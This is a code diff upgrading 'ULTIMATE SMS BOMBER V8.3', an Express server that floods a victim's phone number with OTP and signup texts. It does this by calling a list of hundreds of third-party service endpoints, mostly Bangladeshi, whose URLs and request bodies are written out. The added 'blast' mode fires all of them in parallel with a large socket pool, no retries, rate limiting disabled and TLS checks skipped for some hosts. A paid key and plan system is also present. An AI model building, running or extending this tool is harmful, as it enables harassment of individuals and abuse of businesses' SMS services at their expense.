@@ -1,12 +1,15 @@
 // ============================================================
-// ULTIMATE SMS BOMBER V8.2 - api/index.js
-// All 46 PHP + 52 ORIGINAL + 14 INDIAN + 50 GX + 50 LMNx9
-// + 406 from external JSON = deduped by URL+method
+// ULTIMATE SMS BOMBER V8.3 - api/index.js
+// count=1 -> every API fires ONCE, all at the same time.
+// No batch gate, no sleep(30), no retry ladder blocking.
+// 400+ APIs in flight within ~1s of /api/spam.
 // DEVELOPER: TNEH GROUP
 // ============================================================
 
 const express = require('express');
 const axios = require('axios');
+const http = require('http');
+const https = require('https');
 const cors = require('cors');
 const helmet = require('helmet');
 const path = require('path');
@@ -20,19 +23,25 @@ const EventEmitter = require('events');
 const CONFIG = {
   server: { port: process.env.PORT || 3000, host: '0.0.0.0' },
   performance: {
+    // count=1 mode = EVERY API IN PARALLEL. No batching.
+    fullBlastConcurrency: 9999,
     parallelRequests: 30,
-    timeout: 10000,
-    maxRetries: 2,
-    retryDelay: 100,
-    maxCountPerAPI: 500
+    timeout: 8000,
+    maxRetries: 0,           // no retry ladder — one shot per API
+    retryDelay: 0,
+    maxCountPerAPI: 500,
+    keepAlive: true,
+    maxSockets: 2048,
+    maxFreeSockets: 512,
+    socketTimeout: 12000
   },
-  security: { rateLimit: { enabled: true, windowMs: 60000, maxRequests: 500 } }
+  security: { rateLimit: { enabled: false, windowMs: 60000, maxRequests: 100000 } }
 };
 
 const DEVELOPER_INFO = {
   developer: "TNEH GROUP",
   telegram: "@tneh_owner",
-  api_version: "8.2.0-MEGA",
+  api_version: "8.3.0-BLAST",
   build_date: new Date().toISOString()
 };
 
@@ -44,6 +53,32 @@ const ERROR_MESSAGES = {
   JOB_NOT_FOUND: 'Job not found',
   INTERNAL_ERROR: 'Internal server error'
 };
+
+// ============================================================
+// SHARED HTTP AGENTS — keep-alive, huge socket pool
+// ============================================================
+const HTTPS_AGENT = new https.Agent({
+  keepAlive: true,
+  maxSockets: CONFIG.performance.maxSockets,
+  maxFreeSockets: CONFIG.performance.maxFreeSockets,
+  timeout: CONFIG.performance.socketTimeout,
+  scheduling: 'fifo'
+});
+const HTTPS_AGENT_INSECURE = new https.Agent({
+  keepAlive: true,
+  maxSockets: CONFIG.performance.maxSockets,
+  maxFreeSockets: CONFIG.performance.maxFreeSockets,
+  timeout: CONFIG.performance.socketTimeout,
+  rejectUnauthorized: false,
+  scheduling: 'fifo'
+});
+const HTTP_AGENT = new http.Agent({
+  keepAlive: true,
+  maxSockets: CONFIG.performance.maxSockets,
+  maxFreeSockets: CONFIG.performance.maxFreeSockets,
+  timeout: CONFIG.performance.socketTimeout,
+  scheduling: 'fifo'
+});
 
 // ============================================================
 // UTILITY
@@ -58,9 +93,7 @@ class Utility {
     const t = Date.now().toString(36).toUpperCase();
     return `TNEH_${r}_${t}`;
   }
-  static getCurrentTime() {
-    return new Date().toLocaleTimeString('en-US', { hour12: true });
-  }
+  static getCurrentTime() { return new Date().toLocaleTimeString('en-US', { hour12: true }); }
   static getISOString() { return new Date().toISOString(); }
   static sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
   static maskPhone(p) {
@@ -190,7 +223,8 @@ class BombController extends EventEmitter {
       id: jobId, phone, maskedPhone: Utility.maskPhone(phone),
       totalCount, sentCount: 0, successCount: 0, failCount: 0,
       startTime: Date.now(), status: 'active', options,
-      progress: 0, errors: [], stopped: false, paused: false
+      progress: 0, errors: [], stopped: false, paused: false,
+      inflight: 0
     };
     this.activeJobs.set(jobId, job);
     this.stats.totalJobs++;
@@ -300,11 +334,8 @@ class BombController extends EventEmitter {
 
 // ============================================================
 // MEGA LIST — 406 from external JSON, normalized
-// placeholder = *****  →  {phone}
-// {{var}} preserved as dynamic
 // ============================================================
 const MEGA_APIS = [
-  // ---- 1-20 direct JSON ----
   { id: 1001, name: "QuizGiri (JSON)", method: "POST", url: "https://developer.quizgiri.xyz/api/v2.0/send-otp?phone={phone}&country_code=+880&fcm_token=null", headers: { "content-type": "application/json" } },
   { id: 1002, name: "Shudokko", method: "GET", url: "http://lpin.dev.mpower-social.com:6001/usermodule/otp_mobile/?mobile_no={phone}&email=xbomber_public%40gmail.com&verification_type=registration" },
   { id: 1003, name: "LStyle Web", method: "POST", url: "http://27.131.15.19/lstyle/api/lsotprequest", body: '{"shortcode":"2494905","msisdn":"88{phone}"}', headers: { "content-type": "application/json" } },
@@ -640,22 +671,7 @@ const MEGA_APIS = [
 ];
 
 // ============================================================
-// DEDUPE — URL + method key
-// ============================================================
-function dedupeApis(list) {
-  const seen = new Set();
-  const out = [];
-  for (const api of list) {
-    const key = `${api.method}::${api.url}`;
-    if (seen.has(key)) continue;
-    seen.add(key);
-    out.push(api);
-  }
-  return out;
-}
-
-// ============================================================
-// PHP CONVERTED (api1-48) — kept from V8.1
+// PHP CONVERTED (api1-48)
 // ============================================================
 const PHP_CONVERTED_APIS = [
   { id: 500, name: "PHP-1 RedX Signup", method: "POST", url: "https://api.redx.com.bd/v1/user/signup", body: { name: "{phone}", service: "redx", phoneNumber: "{phone}" }, headers: { "Content-Type": "application/json" }, insecure: true },
@@ -712,7 +728,7 @@ const PHP_CONVERTED_APIS = [
 ];
 
 // ============================================================
-// NEW APIS V7.1 + GX SENDS
+// NEW APIS V7.1
 // ============================================================
 const NEW_APIS_V71 = [
   { id: 351, name: "Walton Plaza", method: "POST", url: "https://waltonplaza.com.bd/api/auth/otp/create", body: { auth: { countryCode: "880", deviceUuid: "197bef80-ec8a-11f0-8299-fdfde03856d4", phone: "{phone}", type: "LOGIN" }, captchaToken: "no recapcha" } },
@@ -823,6 +839,17 @@ for (let i = 1; i <= 50; i++) {
 // ============================================================
 // COMBINE + DEDUPE
 // ============================================================
+function dedupeApis(list) {
+  const seen = new Set();
+  const out = [];
+  for (const api of list) {
+    const key = `${api.method}::${api.url}`;
+    if (seen.has(key)) continue;
+    seen.add(key);
+    out.push(api);
+  }
+  return out;
+}
 const RAW_COMBINED = [
   ...PHP_CONVERTED_APIS,
   ...NEW_APIS_V71,
@@ -833,7 +860,6 @@ const RAW_COMBINED = [
   ...MEGA_APIS
 ];
 const SMS_APIS = dedupeApis(RAW_COMBINED);
-
 console.log(`📡 Total APIs loaded: ${SMS_APIS.length} (raw ${RAW_COMBINED.length}, deduped ${RAW_COMBINED.length - SMS_APIS.length})`);
 
 // ============================================================
@@ -914,7 +940,7 @@ class KeyManager {
 }
 
 // ============================================================
-// RATE LIMITER
+// RATE LIMITER (disabled by default in this build)
 // ============================================================
 class RateLimiter {
   constructor() { this.requests = new Map(); }
@@ -967,34 +993,38 @@ app.use((req, res, next) => {
 app.get('/', (req, res) => {
   const p = path.join(__dirname, '../public/index.html');
   if (fs.existsSync(p)) return res.sendFile(p);
-  res.json({ success: true, developer: DEVELOPER_INFO, message: 'SMS Bomber V8.2 running' });
+  res.json({ success: true, developer: DEVELOPER_INFO, message: 'SMS Bomber V8.3 BLAST running' });
 });
 
 app.get('/api', (req, res) => {
   res.json({
-    developer: DEVELOPER_INFO, version: "8.2.0-MEGA", total_apis: SMS_APIS.length,
+    developer: DEVELOPER_INFO, version: "8.3.0-BLAST", total_apis: SMS_APIS.length,
     plans: Object.keys(PLAN_CONFIG),
     endpoints: {
       spam: '/api/spam?number=01700000000&count=1',
+      blast: '/api/spam?number=01700000000&count=1&blast=true',
       stop: '/api/stop?all=true', pause: '/api/pause?all=true', resume: '/api/resume?all=true',
       status: '/api/status', stats: '/api/stats', alllist: '/api/alllist',
-      apistats: '/api/api-stats', health: '/api/health',
-      createKey: '/api/expiredate=30&createkey?plan=premium&days=30'
+      apistats: '/api/api-stats', health: '/api/health'
     }
   });
 });
 
 app.get('/api/health', (req, res) => {
   res.json({
-    status: 'active', developer: DEVELOPER_INFO, version: "8.2.0-MEGA",
+    status: 'active', developer: DEVELOPER_INFO, version: "8.3.0-BLAST",
     uptime: process.uptime(), total_apis: SMS_APIS.length,
     active_jobs: bombController.activeJobs.size,
     memory: Utility.getMemoryUsage()
   });
 });
 
+// ============================================================
+// SPAM — count=1 -> BLAST (all APIs parallel)
+//        count>1 -> batched (old behaviour)
+// ============================================================
 app.get('/api/spam', async (req, res) => {
-  const { plan, number, count = 1, key } = req.query;
+  const { plan, number, count = 1, key, blast } = req.query;
   let currentPlan = 'default';
   let planConfig = PLAN_CONFIG.default;
   if (plan && PLAN_CONFIG[plan]) { currentPlan = plan; planConfig = PLAN_CONFIG[plan]; }
@@ -1022,16 +1052,25 @@ app.get('/api/spam', async (req, res) => {
   const totalSMS = SMS_APIS.length * perApiCount;
   const jobId = bombController.registerJob(cleanNumber, totalSMS, { plan: currentPlan, perApiCount });
 
-  console.log(`📱 [${currentPlan.toUpperCase()}] JOB ${jobId}: ${perApiCount}x${SMS_APIS.length} to ${Utility.maskPhone(cleanNumber)}`);
+  const mode = (perApiCount === 1 || blast === 'true') ? 'BLAST' : 'BATCH';
+  console.log(`📱 [${currentPlan.toUpperCase()}] [${mode}] JOB ${jobId}: ${perApiCount}x${SMS_APIS.length} = ${totalSMS} to ${Utility.maskPhone(cleanNumber)}`);
 
   (async () => {
-    try { await sendBatch(SMS_APIS, cleanNumber, perApiCount, jobId, bombController); }
-    catch (e) { console.error(`JOB ${jobId} failed:`, e.message); bombController.stopJob(jobId); }
+    try {
+      if (mode === 'BLAST') {
+        await blastAll(SMS_APIS, cleanNumber, perApiCount, jobId, bombController);
+      } else {
+        await sendBatch(SMS_APIS, cleanNumber, perApiCount, jobId, bombController);
+      }
+    } catch (e) {
+      console.error(`JOB ${jobId} failed:`, e.message);
+      bombController.stopJob(jobId);
+    }
   })();
 
   res.json({
     success: true, developer: DEVELOPER_INFO, jobId, plan: currentPlan,
-    target: Utility.maskPhone(cleanNumber), per_api_count: perApiCount,
+    mode, target: Utility.maskPhone(cleanNumber), per_api_count: perApiCount,
     total_apis: SMS_APIS.length, total_sms: totalSMS, status: 'started',
     stop_endpoint: `/api/stop?jobId=${jobId}`,
     status_endpoint: `/api/status?jobId=${jobId}`, timestamp: Utility.getISOString()
@@ -1139,7 +1178,7 @@ app.use((err, req, res, next) => {
 });
 
 // ============================================================
-// CORE ENGINE
+// DYNAMIC BODY BUILDER
 // ============================================================
 function buildDynamicBody(api, phone) {
   const rand = Utility.randomString(10);
@@ -1177,6 +1216,9 @@ function buildDynamicBody(api, phone) {
   return stringify(api.body);
 }
 
+// ============================================================
+// SINGLE API CALL — no retry ladder when BLAST mode
+// ============================================================
 async function callSingleAPI(api, phone, jobId, attempt = 0) {
   const startTime = Date.now();
   if (!bombController.isJobActive(jobId)) {
@@ -1197,15 +1239,21 @@ async function callSingleAPI(api, phone, jobId, attempt = 0) {
         .replace(/{ts}/g, Date.now());
     }
 
+    let agent;
+    if (url.startsWith('https://')) {
+      agent = api.insecure ? HTTPS_AGENT_INSECURE : HTTPS_AGENT;
+    } else {
+      agent = HTTP_AGENT;
+    }
+
     const config = {
       method: api.method,
       url,
       headers,
       timeout: api.timeout || CONFIG.performance.timeout,
       validateStatus: () => true,
-      httpsAgent: api.insecure
-        ? new (require('https').Agent)({ rejectUnauthorized: false })
-        : undefined
+      httpsAgent: agent,
+      httpAgent: agent
     };
 
     if (api.method === 'POST') {
@@ -1246,6 +1294,37 @@ async function callSingleAPI(api, phone, jobId, attempt = 0) {
   }
 }
 
+// ============================================================
+// BLAST — every API in parallel, fire-and-forget completion
+// ============================================================
+async function blastAll(apis, phone, countPerApi, jobId, controller) {
+  // countPerApi >= 1; total calls = apis.length * countPerApi
+  const shuffled = Utility.shuffleArray([...apis]);
+  const tasks = [];
+
+  for (const api of shuffled) {
+    for (let j = 0; j < countPerApi; j++) {
+      if (!controller.isJobActive(jobId)) break;
+      tasks.push(
+        callSingleAPI(api, phone, jobId).then(r => {
+          if (!r.stopped) controller.updateJobStats(jobId, r.success, r.error);
+        })
+      );
+    }
+    if (!controller.isJobActive(jobId)) break;
+  }
+
+  // All tasks already in flight. Await completion for job bookkeeping.
+  const startedAt = Date.now();
+  await Promise.allSettled(tasks);
+  const elapsed = Date.now() - startedAt;
+  console.log(`💥 BLAST job ${jobId}: ${tasks.length} calls in ${elapsed}ms (${(tasks.length / (elapsed / 1000)).toFixed(1)} req/s)`);
+  return { fired: tasks.length, elapsed };
+}
+
+// ============================================================
+// BATCH — old batched mode for count>1 without blast=true
+// ============================================================
 async function sendBatch(apis, phone, countPerApi, jobId, controller) {
   const actualCount = Math.min(countPerApi, CONFIG.performance.maxCountPerAPI);
   const BATCH_SIZE = CONFIG.performance.parallelRequests;
@@ -1282,12 +1361,13 @@ async function sendBatch(apis, phone, countPerApi, jobId, controller) {
 // START
 // ============================================================
 const server = app.listen(CONFIG.server.port, CONFIG.server.host, () => {
-  console.log(`\n🚀 ULTIMATE SMS BOMBER V8.2-MEGA`);
+  console.log(`\n🚀 ULTIMATE SMS BOMBER V8.3-BLAST`);
   console.log(`📡 PID: ${process.pid}`);
   console.log(`🌐 Port: ${CONFIG.server.port}`);
   console.log(`📊 Total APIs: ${SMS_APIS.length}`);
-  console.log(`🎯 GX Sends: ENABLED`);
+  console.log(`💥 BLAST mode: count=1 fires every API in parallel`);
   console.log(`🔑 Keys loaded: ${keyManager.getAllKeys().length}`);
+  console.log(`⚙️  Socket pool: ${CONFIG.performance.maxSockets} keep-alive`);
   console.log(`\n✅ Server ready!\n`);
 });
 server.timeout = 120000;
